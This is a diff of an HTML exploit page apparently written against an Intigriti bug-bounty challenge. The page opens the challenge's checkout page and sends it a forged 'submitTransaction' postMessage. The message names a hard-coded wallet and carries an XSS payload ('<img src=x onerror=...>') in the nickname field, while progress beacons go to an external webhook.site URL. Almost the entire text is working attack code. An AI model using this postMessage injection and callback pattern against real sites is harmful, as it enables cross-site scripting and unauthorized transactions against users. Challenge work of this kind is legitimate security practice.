@@ -1,28 +1,38 @@
 <!DOCTYPE html>
-<html><head><title>Object Exploit</title></head>
+<html><head><title>Opener Exploit</title></head>
 <body>
-<h2>Exploit</h2>
-<pre id=log></pre>
-<object id="x" data="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none"></object>
+<h2>Opening checkout...</h2>
 <script>
-const WEBHOOK = 'https://webhook.site/8b2e60bf-f559-4793-afac-5a501921e9b4';
+const WEBHOOK = 'https://webhook.site/26f7bccf-5ff1-4eb7-94dd-bc44158aaff3';
 const WALLET = '16472226db03703a192aa383237035a69f';
-const log = document.getElementById('log');
 
-function report(s) { log.textContent += '\n' + s; fetch(WEBHOOK + '?s=' + s).catch(()=>{}); }
+fetch(WEBHOOK + '?s=1_START').catch(()=>{});
 
-report('1_LOADED');
+// Open checkout in new window - keeps our window open
+const checkout = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1', '_blank');
 
-document.getElementById('x').onload = function() {
-    report('2_OBJECT_LOADED');
+fetch(WEBHOOK + '?s=2_OPENED').catch(()=>{});
+
+if (checkout) {
+    // Send postMessage to the opened window
     setTimeout(function() {
-        document.getElementById('x').contentWindow.postMessage({
+        fetch(WEBHOOK + '?s=3_SENDING').catch(()=>{});
+        
+        checkout.postMessage({
             type: 'submitTransaction',
-            transaction: {toAddress: WALLET, currency: '1337COIN', amount: 1, nickname: '<img src=x onerror="alert(\'gigawatz\')">'}
-        }, '*');
-        report('3_POSTMESSAGE_SENT');
-    }, 2000);
-};
+            transaction: {
+                toAddress: WALLET,
+                currency: '1337COIN',
+                amount: 1,
+                nickname: '<img src=x onerror="alert(\'gigawatz\')">'
+            }
+        }, 'https://challenge-0126.intigriti.io');
+        
+        fetch(WEBHOOK + '?s=4_SENT').catch(()=>{});
+    }, 3000);
+} else {
+    fetch(WEBHOOK + '?s=2_BLOCKED').catch(()=>{});
+}
 </script>
 </body>
 </html>
